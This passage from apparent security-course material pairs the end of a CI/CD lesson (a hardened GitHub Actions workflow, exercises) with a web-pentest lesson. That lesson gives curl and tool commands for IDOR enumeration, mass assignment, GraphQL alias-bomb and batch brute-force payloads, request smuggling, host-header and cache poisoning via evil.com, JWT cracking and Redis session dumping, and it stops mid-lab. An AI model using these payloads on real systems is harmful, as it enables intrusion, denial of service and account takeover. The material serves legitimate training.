name: PR Greeter (Patched)
on:
  pull_request_target:
    types: [opened, synchronize]

permissions:
  contents: read
  pull-requests: write
  issues: write

jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      # Explicitly check out the fork's head SHA in a sandboxed way.
      # We do NOT execute code from the fork — only read metadata.
      - name: Check out PR head at pinned SHA
        uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
          persist-credentials: false

      - name: Post greeting safely
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          # Move fork-controlled data through env vars, never through
          # direct expression interpolation into a shell.
          PR_TITLE: ${{ github.event.pull_request.title }}
          PR_HEAD_REF: ${{ github.event.pull_request.head.ref }}
          PR_USER: ${{ github.event.pull_request.user.login }}
          PR_NUMBER: ${{ github.event.pull_request.number }}
          REPO: ${{ github.repository }}
        run: |
          # Sanitize: allow only a safe subset of characters.
          safe_title=$(printf '%s' "$PR_TITLE" | tr -cd '[:alnum:] .,:;!?_-' | head -c 200)
          gh api "/repos/$REPO/issues/$PR_NUMBER/comments" \
            -f body="Thanks for PR titled: $safe_title"

The two defensive controls:

    Fork-controlled data flows through environment variables, not through direct interpolation. The shell sees "$PR_TITLE", which is a variable expansion at shell time and cannot inject syntax.
    Even the sanitized value is length-limited and character-restricted before being sent to an API that could re-render it.

18.5 Verification

Re-run the PR-title exploit against the patched workflow. Confirm:

    The webhook receives nothing.
    The comment posted contains the raw injection string as inert text.

18.6 Extra Credit

    Add actionlint and zizmor to CI as required checks.
    Enable branch protection requiring signed commits on main.
    Rotate the FAKE_DEPLOY_KEY and confirm the old value is revoked.

19. Exercises
Guided (walk-throughs available in the lab handbook)

    Trigger-audit a real organization. Clone at least ten public repos of your choice. Enumerate every workflow using pull_request_target, workflow_run, or issue_comment. For each, identify whether fork-controlled expressions land in a run: step. Produce a table of repo, workflow, line, and risk.
    Self-hosted runner enumeration. Using gh api /orgs/<org>/actions/runners (against organizations you have permission to inspect), list all self-hosted runners. Cross-reference which repositories are configured to use them and whether those repositories accept fork PRs. Report the top three highest-risk combinations.
    Secret leak triage. Clone your own historical projects. Run trufflehog git file://. --only-verified and gitleaks detect --source . --log-opts="--all". For every verified finding, rotate the credential and record the rotation timestamp. Confirm the old credential fails against the API.

Independent (design and defend your solution)

    Build an OIDC-only deploy pipeline. Rewrite a small demo application's deploy job to use GitHub Actions OIDC federation to AWS (no static access key anywhere). Document your IAM trust policy, the workflow, and the exact scope of the assumed role. Prove that no long-lived credential is stored anywhere.
    Ship a signed, attested container. Take a public sample app. Build the image, sign it with cosign keyless, generate an SBOM with syft, attest the SBOM and SLSA provenance, and write a Kyverno or Sigstore Policy Controller policy that admits only images signed by your workflow identity. Demonstrate an unauthorized image being rejected at admission.
    Compromise-and-recover tabletop. Assume tj-actions/changed-files@v40 was compromised and your workflow used it three months ago. Write the incident-response runbook: which secrets to rotate, which artifacts to distrust, which downstream consumers to notify, and how to verify no persistence remains in your build environment.

20. Summary and Next-Lesson Pointer

CI/CD is the highest-leverage attack surface in most modern engineering organizations. A single compromised workflow, action, or dependency can propagate to every environment the pipeline touches, and can persist through build outputs long after the original access is closed. The recurring themes:

    Runners are privileged. Treat every run: block as code execution on a system that holds real secrets.
    Fork-controlled inputs must never reach a shell via direct expression interpolation. Route through environment variables, sanitize, and use least-scoped triggers.
    Ephemeral, hermetic, reproducible builds shrink the SolarWinds attack surface.
    Pin dependencies to digests, sign artifacts with cosign, attest provenance with in-toto/SLSA, and enforce those signatures at deploy time.
    Rotate on every suspected exposure. Scanning is table stakes; verified secrets from trufflehog are compromised even if not yet exploited.
    Detection lives in the audit log. Stream it to a SIEM and hunt for self-hosted runner registration, protected-branch changes, and unusual workflow additions.

In the next lesson — Lesson 07: Kubernetes Security Fundamentals — we move one layer down from the pipeline to the runtime it deploys to. We will look at RBAC boundaries, pod security standards, admission control, service-account token abuse, and the classic escape paths from a pod to the node and from the node to the cluster. The container images signed and attested in this lesson are the inputs to the admission policies we will design in the next.



























Lesson 07 — Web Application Architecture Deep Dive

    Module 04: Containers and Software Architecture · Penetration Testing with Kali Linux 1.0 · Red Team Leaders

Introduction

Knowing the architecture of a target web application doubles the pentester's hit rate. Two testers running the same wordlist against the same domain will produce wildly different reports if only one of them recognizes that the app is a Next.js SSR bundle sitting behind a Cloudflare edge with an nginx origin and a Redis-backed session store. The one who reads the architecture picks the right class of bugs on the first try, saves hours on dead-end fuzzing, and finds the misconfigurations that boilerplate scanners never see.

This lesson dissects the modern web stack the way a penetration tester needs to see it: every rendering model that ships JavaScript in 2026, the API paradigms that sit behind those front-ends, the reverse proxies, load balancers and CDNs that fan out the traffic, and the session and content-security controls layered over the top. Each section carries a pentest angle — the class of bug the architecture invites, the fingerprint you use to spot it, and the concrete Kali 2026 command that turns theory into a finding.

By the end you will look at a fresh scope and, from headers and a JavaScript bundle alone, be able to name the framework, the render mode, the API style, the CDN, the reverse proxy and the session model — and know which four attacks to try first.
1. Introduction — Knowing the Architecture Doubles the Hit Rate

A traditional pentester runs nikto, dirb, sqlmap in that order and calls it a day. A modern web pentester spends the first hour of an engagement doing nothing but architectural fingerprinting, because the architecture dictates the entire test plan.
1.1 Why Architecture Matters Before Any Payload

Consider the same target — https://app.example.com — under three different architectures:
Architecture	First 4 Bugs to Test
Rails MPA + Postgres	CSRF, SQLi, mass assignment, session fixation
React SPA + REST API	JWT tampering, IDOR, CORS misconfig, source-map disclosure
Next.js SSR + GraphQL	SSTI in getServerSideProps, GraphQL introspection, batch DoS, cache poisoning at Vercel edge

The wordlist that would spot a bug on the Rails app finds nothing on the SPA and gets rate-limited on the SSR app. The wordlist is not the problem — the missing architectural read is.
1.2 The Architecture Reconnaissance Loop

Every engagement should begin with the loop below before a single payload is sent:
┌────────────────────────────────────────────────────────────┐
│  1. Fingerprint the front-end (framework, render mode)     │
│  2. Fingerprint the API (REST/GraphQL/gRPC-Web/WebSocket)  │
│  3. Fingerprint the edge (CDN, WAF, reverse proxy)         │
│  4. Fingerprint the session model (cookie/JWT/session id)  │
│  5. Fingerprint the content-security posture (CSP, CORS)   │
│  6. Map every URL/endpoint that came out of steps 1–5      │
│  7. Choose the top 5 bug classes for THIS stack, only then │
│     open Burp, ffuf, sqlmap, etc.                          │
└────────────────────────────────────────────────────────────┘

    Pentester Insight: Steps 1–6 above are pure reconnaissance and cost no requests that a WAF would rate-limit. Do them from your Kali box with curl, jq, whatweb, wappalyzer-cli, httpx and a browser dev-tools tab. Only when you know the shape of the target do you move to Burp and active fuzzing.

2. MPA vs SPA vs SSR vs SSG vs ISR — Every Model That Ships JavaScript Today

There are five distinct rendering models in production in 2026, and each one leaves a fingerprint in the HTML response and each one invites a different class of bug.
2.1 MPA — Multi-Page Application

The classic model. Every navigation is a full HTTP round-trip that returns a complete HTML document rendered on the server. Think Django, Rails, Laravel, Spring MVC, ASP.NET MVC, WordPress.
# Fingerprint an MPA:
curl -sI https://target.example.com/ | grep -i 'x-powered-by\|server'
# Server: nginx
# X-Powered-By: PHP/8.2.15

# The HTML source is FULL and MEANINGFUL:
curl -s https://target.example.com/ | grep -c '<form\|<h1\|<article'
# 47   <- content is server-rendered

Pentest angle: MPAs speak session cookies and hidden form fields. The bug classes to hunt first are CSRF (missing tokens or reusable tokens), server-side template injection (SSTI) in error pages and email views, and classic SQLi in the query-string parameters that the server obviously parses.
2.2 SPA — Single-Page Application

The browser downloads one small HTML shell and a large JavaScript bundle that renders every subsequent view client-side. Data comes from an API. Think Create-React-App, Vue CLI, Angular CLI.
# Fingerprint an SPA — the HTML is almost empty:
curl -s https://spa.example.com/ | wc -l
# 12   <- twelve lines total

curl -s https://spa.example.com/ | grep -oE 'src="[^"]*\.js"'
# src="/static/js/main.4f3a2b.js"
# src="/static/js/vendors.9c1e.js"

# Grab the bundle and check for a source map:
curl -sI https://spa.example.com/static/js/main.4f3a2b.js | grep -i sourcemap
# SourceMap: main.4f3a2b.js.map

# If the .map file is public, you have the original source:
curl -s https://spa.example.com/static/js/main.4f3a2b.js.map -o main.js.map
npx source-map-explorer main.js.map --tsv > components.tsv

Pentest angle: source map = code review target. A published .map file gives you the original React/Vue/TypeScript source, including comments and internal variable names. This turns a black-box pentest into a white-box code review. Additionally, since every screen calls the API directly, the SPA bundle is a full API endpoint map — grep -oE '"/api/[^"]+"' main.js enumerates the entire attack surface in seconds.
2.3 SSR — Server-Side Rendering

The server runs the same JavaScript framework the browser will run and returns a fully-rendered HTML document, then hydrates it in the browser. Think Next.js (getServerSideProps), Nuxt (asyncData), SvelteKit (load), Remix (loader).
# Fingerprint SSR — HTML is full AND there is a hydration payload:
curl -s https://ssr.example.com/ | grep -c '__NEXT_DATA__\|__NUXT__\|__SVELTEKIT_'
# 1

curl -s https://ssr.example.com/ | grep -oE '__NEXT_DATA__[^<]*' | head -c 200

Pentest angle: server-side template injection. SSR frameworks run untrusted user input through a rendering pipeline that can, under bad developer patterns, evaluate template expressions on the server. If a Next.js page passes req.query.name directly into a rendered React component whose props are later serialized via dangerouslySetInnerHTML, you get XSS that fires on the server — often bypassing the CSP because the injected script is inline in the initial HTML. Also look for path traversal in getServerSideProps file reads, SSRF in server-fetched props, and prototype pollution in the hydration payload.
2.4 SSG — Static Site Generation

Every page is pre-rendered at build time into flat HTML and served from a CDN. Think Gatsby, Astro (default), Hugo, Jekyll, Next.js getStaticProps without ISR.
# Fingerprint SSG — HTML is full, headers show CDN cache HIT, no session cookie:
curl -sI https://ssg.example.com/ | grep -i 'cache\|age\|x-vercel\|cf-cache'
# cache-control: public, max-age=31536000
# age: 84213
# cf-cache-status: HIT

Pentest angle: focus on the API. The static HTML is a dead end — it was built at CI time and cannot be exploited. But an SSG site almost always calls a live API for anything dynamic (login, comments, search). Skip the pages, grep the JavaScript for endpoints, and attack the API directly.
2.5 ISR — Incremental Static Regeneration

A hybrid: pages are static, but the CDN regenerates them on a timer or on-demand via a revalidation endpoint. Think Next.js revalidate, Nuxt swr.
# Fingerprint ISR — cache-control with s-maxage and stale-while-revalidate:
curl -sI https://isr.example.com/products/42 | grep -i 'cache-control\|x-vercel-cache'
# cache-control: s-maxage=60, stale-while-revalidate=300
# x-vercel-cache: STALE

Pentest angle: cache poisoning. ISR caches by URL, sometimes with additional keys. If any user-controlled input flows into the rendered page but is NOT part of the cache key, you have unkeyed input — inject a payload that lands in the HTML, then every subsequent visitor is served your version. Common unkeyed inputs: X-Forwarded-Host, X-Original-URL, X-Rewrite-URL, cookies read on the server but not part of the cache key.
3. Frontend Frameworks Landscape

Fingerprinting the exact framework and version cuts the CVE search to seconds.
3.1 React
# React fingerprint — look for reactroot attribute or hydration marker:
curl -s https://target/ | grep -oE 'data-reactroot\|__reactContainer\$[a-z0-9]+'

# In the JavaScript bundle:
curl -s https://target/static/js/main.*.js | strings | grep -oE 'react-dom@[0-9.]+' | sort -u
3.2 Vue
# Vue leaves data-v-* attribute hashes on rendered elements:
curl -s https://target/ | grep -oE 'data-v-[a-f0-9]{8}' | head -3

# Nuxt-specific:
curl -s https://target/ | grep -o '__NUXT__'
3.3 Angular
# Angular ships ng-version on the root element:
curl -s https://target/ | grep -oE 'ng-version="[0-9.]+"'
# ng-version="17.3.2"
3.4 Next.js
# Next.js signatures:
curl -sI https://target/ | grep -i 'x-powered-by\|x-nextjs'
# x-powered-by: Next.js
# x-nextjs-cache: HIT

# Version is in _next/static path:
curl -s https://target/ | grep -oE '/_next/static/[^/]+/'
# /_next/static/chunks/    <- confirms Next.js
3.5 Nuxt
curl -s https://target/ | grep -oE '/_nuxt/[^"]+\.js' | head -3
3.6 SvelteKit
curl -s https://target/ | grep -oE '__SVELTEKIT_DATA__\|/_app/immutable/'
3.7 Automated Framework Fingerprinting
# whatweb is the classic:
whatweb -a 3 https://target.example.com

# wappalyzer CLI (npm package):
npx wappalyzer https://target.example.com --pretty

# httpx (from projectdiscovery) fingerprints in bulk:
echo target.example.com | httpx -tech-detect -title -status-code -web-server
4. REST API Design Patterns and Attack Angles

REST is the dominant API style. Its predictability is exactly what makes it easy to attack.
4.1 The REST Contract
GET     /api/users              → list all users
GET     /api/users/42           → read user 42
POST    /api/users              → create a user
PUT     /api/users/42           → replace user 42
PATCH   /api/users/42           → modify user 42
DELETE  /api/users/42           → delete user 42

Status codes carry meaning: 200 OK, 201 Created, 204 No Content, 400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found, 409 Conflict, 422 Unprocessable Entity, 429 Too Many Requests, 500 Server Error.
4.2 IDOR — Enumerate the IDs

Any numeric ID in a URL invites Insecure Direct Object Reference testing. If /api/users/42 returns your own profile, try /api/users/41, /api/users/43, /api/users/1.
# Manual IDOR probe with curl:
for id in $(seq 1 100); do
  status=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $TOKEN" \
    https://target/api/users/$id)
  echo "$id $status"
done | grep ' 200'

# Automated with ffuf:
ffuf -u https://target/api/users/FUZZ \
     -w /usr/share/wordlists/seclists/Fuzzing/numbers.txt \
     -H "Authorization: Bearer $TOKEN" \
     -mc 200 -fs 34
4.3 Mass Assignment

If a POST /api/users accepts a JSON body {"name":"joe","email":"j@e.com"}, try adding "role":"admin" or "is_admin":true. Frameworks that bind request bodies directly to ORM models will happily set the extra field.
curl -X POST https://target/api/users \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name":"joe","email":"j@e.com","role":"admin","is_verified":true,"balance":999999}'
4.4 Verb Tampering

Access controls sometimes check POST but forget PUT or PATCH. If POST /api/admin/users returns 403, try PUT, PATCH, DELETE, or the exotic HEAD and OPTIONS.
for verb in GET POST PUT PATCH DELETE HEAD OPTIONS CONNECT TRACE; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X $verb https://target/api/admin/users)
  echo "$verb $code"
done
4.5 HATEOAS Response Leaks

APIs that return hypermedia links often over-share. A user endpoint that returns "_links":{"admin":"/api/admin/users/42"} has just told you the admin URL exists — even if your token cannot follow it.
5. GraphQL Architecture

GraphQL replaces many REST endpoints with a single POST endpoint (usually /graphql) that accepts a query string describing exactly the fields the client wants.
5.1 The GraphQL Shape

    Single endpoint — one URL, one verb (POST), one content-type (application/json).
    Schema — a strongly typed contract of every queryable field and mutation.
    Resolvers — functions on the server that fetch each field.
    Batching — multiple queries can be sent in one HTTP request.

5.2 Introspection Query

If introspection is enabled the entire schema is available for the asking:
curl -X POST https://target/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name type{name kind ofType{name}}}}}}"}'

# Nicer with a tool:
gograpql -u https://target/graphql -introspection
# or
graphw00f -f -t https://target/graphql

# Convert the introspection JSON to an SDL file:
get-graphql-schema https://target/graphql > schema.graphql
5.3 Alias-Based DoS

Aliases let a client call the same expensive field many times in one request:
{
  a1: expensiveReport(id:1) { data }
  a2: expensiveReport(id:2) { data }
  a3: expensiveReport(id:3) { data }
  # ... a1000: expensiveReport(id:1000) { data }
}

One HTTP request, one thousand database queries. If the server has no query-cost analysis, this is an instant DoS.
# Generate an alias-bomb payload:
python3 -c "
q='{'
for i in range(1000):
  q += f'a{i}: user(id:{i}) {{ id email }} '
q += '}'
import json,sys; print(json.dumps({'query': q}))
" > bomb.json

curl -X POST https://target/graphql \
  -H "Content-Type: application/json" \
  --data @bomb.json -o /dev/null -w "time=%{time_total}s size=%{size_download}\n"
5.4 Batch Abuse

Servers that accept an array of queries in one request can be used to brute-force logins without triggering per-request rate limits:
curl -X POST https://target/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"mutation{login(user:\"admin\",pass:\"1\"){token}}"},
       {"query":"mutation{login(user:\"admin\",pass:\"2\"){token}}"},
       {"query":"mutation{login(user:\"admin\",pass:\"3\"){token}}"}]'
5.5 GraphQL-Specific Tooling
# Install and run graphql-cop for a full audit:
pipx install graphql-cop
graphql-cop -t https://target/graphql -o json
6. WebSocket Architecture

WebSockets upgrade an HTTP connection to a persistent bidirectional channel. Traders, chat apps, live dashboards and multiplayer games all speak WebSocket.
6.1 The Upgrade Handshake
Client → GET /ws HTTP/1.1
         Host: target.example.com
         Upgrade: websocket
         Connection: Upgrade
         Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
         Sec-WebSocket-Version: 13
         Origin: https://target.example.com

Server → HTTP/1.1 101 Switching Protocols
         Upgrade: websocket
         Connection: Upgrade
         Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
6.2 Socket.IO — the Framing Layer

Socket.IO is a library on top of WebSocket that adds rooms, namespaces, ack callbacks and fallback to long-polling. It has its own text framing (42["event",{"data":1}]) that tools sometimes miss.
6.3 CSWSH — Cross-Site WebSocket Hijacking

WebSockets do not send preflight CORS requests. If the server accepts the connection based only on cookies and does not validate the Origin header, an attacker's page at https://evil.com can open a WebSocket to the victim's app and receive/send messages authenticated as the victim.
# Check whether the server validates Origin:
websocat -H='Origin: https://evil.com' 'wss://target.example.com/ws'
# If it stays open and you can send/receive messages, CSWSH is possible.
6.4 Message Injection

Even authenticated WebSocket channels usually forward frames without validating that the sender has permission for the action requested inside the frame. Send {"cmd":"broadcast","room":"admin","msg":"..."} and see if the server refuses.
websocat 'wss://target/ws' \
  -H='Cookie: session=<victim-session>' \
  --text
> {"cmd":"joinRoom","room":"admin"}
> {"cmd":"listUsers"}
7. gRPC-Web Through Envoy

Browsers cannot speak native gRPC — HTTP/2 trailers and the binary framing are not exposed by fetch. gRPC-Web is a browser-compatible wire format that an Envoy proxy translates into real gRPC for the backend.
7.1 The Shape
Browser  ──(HTTP/1.1 or HTTP/2 with base64 body)──►  Envoy  ──(HTTP/2 gRPC)──►  Backend
Content-Type: application/grpc-web+proto
7.2 Fingerprint
curl -sI -X POST https://target/api.UserService/GetProfile | grep -i grpc
# content-type: application/grpc-web+proto
# grpc-status: 0
7.3 Attack Angles

    grpcurl over the plaintext Envoy admin port — if 9901 or 8080 is exposed you may get server reflection and a full service list.
    Message tampering — the payload is a length-prefixed protobuf; decode with protoc --decode_raw and re-encode with a modified field.
    Deadline/backend leak — Envoy sometimes echoes upstream host in grpc-message on error.

grpcurl -plaintext target:9901 list
grpcurl -plaintext target:9901 describe api.UserService
8. Reverse Proxies — Request Smuggling Primer

Every serious production app hides its origin behind a reverse proxy: nginx, HAProxy, Envoy, Apache mod_proxy, Traefik, Caddy.
8.1 Why Reverse Proxies Create Bugs

The proxy and the backend are two independent HTTP parsers. Whenever they disagree about where one request ends and the next begins, an attacker can smuggle a second request through, past all proxy-level access control.
8.2 HTTP Request Smuggling Variants

    CL.TE — the proxy uses Content-Length, the backend uses Transfer-Encoding: chunked.
    TE.CL — the proxy uses Transfer-Encoding, the backend uses Content-Length.
    TE.TE — both use Transfer-Encoding but one is tricked into ignoring the header by an obfuscated variant (Transfer-Encoding : chunked, tab, extra header, chunked value with weird casing).

8.3 CL.TE Example Payload
POST / HTTP/1.1
Host: target.example.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

The proxy reads 13 bytes (the entire 0\r\n\r\nSMUGGLED body) and forwards them. The backend parses Transfer-Encoding: chunked, sees the 0 terminator, and treats SMUGGLED as the start of the NEXT request from the same connection — which will be prepended to the next real user's request.
8.4 Automated Smuggling Discovery
# smuggler.py is the canonical PoC scanner:
git clone https://github.com/defparam/smuggler.git
python3 smuggler/smuggler.py -u https://target.example.com/

# Kali also ships http-request-smuggler as a Burp extension.
8.5 Header Override Attacks

Reverse proxies often trust internal headers from downstream services. If nginx does not strip them, an attacker can send X-Forwarded-For, X-Real-IP, X-Original-URL, X-Rewrite-URL, or X-Forwarded-Host and manipulate the backend's view of the request.
# Try to bypass an IP allowlist:
curl -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 10.0.0.1" \
     https://target/admin

# Try to reach an internal path via rewrite override:
curl -H "X-Original-URL: /admin/dashboard" https://target/
curl -H "X-Rewrite-URL: /admin/dashboard" https://target/
9. Load Balancers — L4 vs L7
9.1 Layer 4 vs Layer 7

    L4 load balancer — routes on IP/port only. Does not read HTTP. Examples: AWS NLB, HAProxy in TCP mode, keepalived.
    L7 load balancer — reads HTTP headers, path, cookies. Can route by host, path, or session cookie. Examples: nginx, HAProxy in HTTP mode, AWS ALB, Envoy, F5.

9.2 Sticky Sessions

L7 balancers pin a client to a specific backend via a cookie (AWSALB, JSESSIONID, custom BACKENDID) or an IP hash. Sticky sessions leak two things:

    Backend count — send many requests with fresh cookies, count unique AWSALB values.
    Backend identity — the cookie value often base64-decodes into an internal hostname.

# Reveal backends via sticky cookie:
for i in $(seq 1 20); do
  curl -sI https://target/ | grep -i 'set-cookie: awsalb\|set-cookie: backend'
done | sort -u

# Base64-decode a suspicious sticky value:
echo 'aTAxLm9yaWdpbi5pbnRlcm5hbA==' | base64 -d
# i01.origin.internal
9.3 Health Checks That Leak Backend Paths

Load balancers poll each backend on a health-check URL. If the path is left at its default (/health, /healthz, /status, /ping, /actuator/health, /api/health) and that endpoint returns verbose data, you can enumerate backend software from the outside.
for path in /health /healthz /status /ping /actuator/health /api/health /_status/vars; do
  echo -n "$path -> "
  curl -s -o /dev/null -w "%{http_code}\n" https://target$path
done
10. CDN Architecture

Cloudflare, Fastly, CloudFront, Akamai and Bunny sit between the user and the origin. They cache, they filter (WAF), and they hide the origin IP.
10.1 Fingerprint the CDN
curl -sI https://target/ | grep -iE 'server|cf-ray|x-served-by|x-cache|x-amz-cf-id'
# server: cloudflare               <- Cloudflare
# cf-ray: 8b1c...
# x-served-by: cache-lax-...       <- Fastly
# x-amz-cf-id: ...                 <- CloudFront
10.2 Cache Poisoning via Unkeyed Headers

If a header is reflected in the cached response but is NOT part of the cache key, an attacker can inject a payload once and every subsequent visitor is served the poisoned page.
# Test whether X-Forwarded-Host is reflected and unkeyed:
curl -H "X-Forwarded-Host: evil.com" https://target/ | grep -o 'evil.com'
# If the response reflects it, replay without the header — if the reflection persists,
# the payload is cached and every visitor now sees "evil.com" in the page.

# param-miner (Burp extension) automates unkeyed header discovery.
# Standalone alternative:
web-cache-vulnerability-scanner scan https://target/
10.3 Host Header Injection
curl -H "Host: evil.com" https://target/ -k
# If the server responds with an evil.com password reset link in the body,
# it built the URL from Host — combine with cache poisoning for account takeover.
10.4 Origin Discovery

The CDN protects the app only if the origin IP is secret. Two techniques recover it:

Certificate Transparency + Shodan:
# Pull all certificates ever issued for the domain:
curl -s 'https://crt.sh/?q=%25.example.com&output=json' | \
  jq -r '.[].name_value' | sort -u

# Take any subdomain that is NOT proxied by the CDN and resolve it:
dig +short old-staging.example.com

# Cross-reference in Shodan:
shodan search 'ssl:"example.com" -org:"Cloudflare"'

Favicon hashing:
# Compute the Shodan favicon hash of the target:
python3 -c "
import mmh3, requests, codecs
r = requests.get('https://target/favicon.ico')
b = codecs.encode(r.content, 'base64')
print(mmh3.hash(b))
"
# Then search Shodan for that hash (any host serving the same favicon):
shodan search 'http.favicon.hash:-1223143404'
11. Edge Functions

Cloudflare Workers, Lambda@Edge, Vercel Edge Functions and Netlify Edge run JavaScript/WASM at CDN nodes.
11.1 Attack Surface

    Cold-start info leak — first request after a deploy often takes seconds and may return partial output.
    KV store misconfig — Workers KV and DynamoDB Global Tables are eventually consistent; race conditions between edge locations are common.
    Bypass at the origin — because the edge function is only enforced on requests that hit the CDN, discovering the origin IP (section 10.4) lets you skip the edge entirely.

11.2 Fingerprint
curl -sI https://target/ | grep -i 'cf-worker\|x-vercel-id\|x-amz-cf-id.*Lambda'
# cf-worker: hello-world
# x-vercel-id: iad1::abcd
11.3 Probing an Edge Worker
# Compare edge-processed response to direct origin (if IP known):
curl -sI https://target/ | md5sum
curl -sI --resolve target.example.com:443:1.2.3.4 https://target/ | md5sum
# Different hashes → the edge is rewriting responses. Diff them to see what it strips.
12. Session Management Architectures
12.1 Cookie-Based Server Session

The classic. Server generates a random session ID, stores state server-side (usually Redis), sends the ID in a cookie. Look for Set-Cookie: sessionid=...; HttpOnly; Secure; SameSite=Lax. Missing HttpOnly = XSS steals it. Missing Secure = network sniffing on HTTP. Missing SameSite = CSRF.
12.2 JWT

Self-contained token, signed but often not encrypted. Base64-decode the middle segment to read the claims.
JWT='eyJhbGciOi...'
echo $JWT | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# Classic attacks:
# 1. alg=none — strip the signature
# 2. HS256/RS256 confusion — sign with the RSA public key as HMAC secret
# 3. weak HS256 secret — crack with hashcat
hashcat -a 0 -m 16500 $JWT /usr/share/wordlists/rockyou.txt
12.3 Server-Side Session Store in Redis

If the backend keeps session data in Redis and Redis is exposed (port 6379, sometimes on internal networks reachable via SSRF), you may dump every active session.
redis-cli -h 10.0.0.5 -p 6379 keys 'session:*'
redis-cli -h 10.0.0.5 -p 6379 get 'session:abc123'
13. CORS Deep Dive

Cross-Origin Resource Sharing controls which foreign origins can read a response.
13.1 The Killer Combo
Access-Control-Allow-Origin: https://evil.com    <- reflected from Origin header
Access-Control-Allow-Credentials: true

If the server reflects any Origin value and sets credentials to true, an attacker's page can read the victim's authenticated responses.
13.2 Testing CORS
# Basic reflection test:
curl -sI -H "Origin: https://evil.com" https://target/api/me | grep -i access-control
# access-control-allow-origin: https://evil.com
# access-control-allow-credentials: true

# Null origin — some libraries treat "null" as always-allowed:
curl -sI -H "Origin: null" https://target/api/me | grep -i access-control

# Subdomain wildcard bypass — Origin: https://evil.target.com
# works if the server trusts *.target.com without validating attacker-controlled subdomains.

# CORScanner automates the checks:
pipx install corscanner
corscanner -u https://target/api/me
14. Content Security Policy

CSP is a header (or <meta> tag) that whitelists sources for scripts, styles, connections and framing.
14.1 Reading a Policy
curl -sI https://target/ | grep -i content-security-policy
# content-security-policy: default-src 'self'; script-src 'self' 'nonce-abc123' https://cdn.example.com; object-src 'none'
14.2 Common Weaknesses

    script-src 'unsafe-inline' — inline scripts allowed; CSP does nothing against XSS.
    script-src * — trivially bypassable.
    script-src 'self' with a JSONP endpoint on the same origin — the JSONP callback is your script gadget.
    script-src https: — any HTTPS host works.
    Missing object-src 'none' — Flash/plugin content can execute.
    report-only mode — the policy is only logged, never enforced.

14.3 Automated Analysis
# csp-evaluator (Google, CLI wrapper):
npm i -g csp-evaluator
csp-evaluator "$(curl -sI https://target/ | grep -i content-security-policy | cut -d: -f2-)"

# Mozilla Observatory scans the whole security header suite:
curl -s "https://http-observatory.security.mozilla.org/api/v1/analyze?host=target.example.com" -X POST
15. Fingerprinting an Architecture End-to-End

Combine everything into a single recon pass.
15.1 The Recon One-Liner
TARGET=target.example.com
whatweb -a 3 https://$TARGET
npx wappalyzer https://$TARGET --pretty
curl -sI https://$TARGET | tee headers.txt
grep -iE 'server|x-powered-by|cf-ray|x-vercel|x-amz-cf|cache-control|set-cookie' headers.txt

# JS bundle harvest:
curl -s https://$TARGET/ | grep -oE '(src|href)="[^"]+\.(js|css)"' > assets.txt
15.2 Source Map Hunt
for js in $(cat assets.txt | grep -oE '[^"]+\.js'); do
  code=$(curl -sI "https://$TARGET$js" -o /dev/null -w "%{http_code}")
  map=$(curl -sI "https://$TARGET$js.map" -o /dev/null -w "%{http_code}")
  echo "$js js=$code map=$map"
done
15.3 API Endpoint Extraction
mkdir -p bundles && cd bundles
curl -s https://$TARGET/ | grep -oE 'src="[^"]+\.js"' | \
  sed 's/src="//;s/"$//' | \
  xargs -I{} curl -s "https://$TARGET{}" -o "$(basename {})"

grep -hoE '"/api/[a-zA-Z0-9_/{}.-]+"' ./*.js | sort -u > endpoints.txt
wc -l endpoints.txt
15.4 Favicon Hash
python3 -c "
import mmh3, requests, codecs
r = requests.get('https://$TARGET/favicon.ico', timeout=10)
b = codecs.encode(r.content, 'base64')
print('Shodan favicon hash:', mmh3.hash(b))
"
16. Hands-On — Attack a Lab Next.js SSR App

This exercise puts every section together. The lab target is a deliberately vulnerable Next.js 14 app running under nginx, deployed at http://lab-nextjs.pentest.local:3000 inside the course container.
16.1 Bring Up the Lab
cd /opt/labs/module-04
docker compose up -d lab-nextjs nginx-proxy
docker compose ps
# lab-nextjs   Up   3000/tcp
# nginx-proxy  Up   0.0.0.0:8080->80/tcp
16.2 Step 1 — Fingerprint the Stack
TARGET=http://lab-nextjs.pentest.local:8080
curl -sI $TARGET/ | tee step1.txt
# server: nginx/1.25.3
# x-powered-by: Next.js
# x-nextjs-cache: MISS

whatweb -a 3 $TARGET
# Detects: Next.js, React, nginx

Verdict — Next.js SSR behind nginx. Expect: SSRF/SSTI in getServerSideProps, IDOR in /api/*, header-override bugs at nginx.
16.3 Step 2 — Find API Endpoints in the Bundle
mkdir bundle && cd bundle
curl -s $TARGET/ > index.html
grep -oE '/_next/static/chunks/[^"]+\.js' index.html | sort -u | \
  xargs -I{} curl -s "$TARGET{}" -o "$(basename {})"

grep -hoE '"/api/[a-zA-Z0-9_/{}.-]+"' ./*.js | sort -u
# "/api/users/[id]"
# "/api/orders/[id]"
# "/api/admin/config"
16.4 Step 3 — Test /api/orders/{id} for IDOR
# Log in and grab the JWT:
TOKEN=$(curl -s -X POST $TARGET/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"user":"alice","pass":"alicepw"}' | jq -r .token)

# Alice's own order:
curl -s $TARGET/api/orders/1001 -H "Authorization: Bearer $TOKEN" | jq .

# Bob's order — should be 403 but is not:
curl -s $TARGET/api/orders/1002 -H "Authorization: Bearer $TOKEN" | jq .
# {"id":1002,"customer":"bob","total":499.99}   <- IDOR confirmed

Enumerate the whole range:
for id in $(seq 1000 1100); do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $TOKEN" $TARGET/api/orders/$id)
  [ "$code" = "200" ] && echo "$id 200"
done
16.5 Step 4 — Nginx Host Header Injection

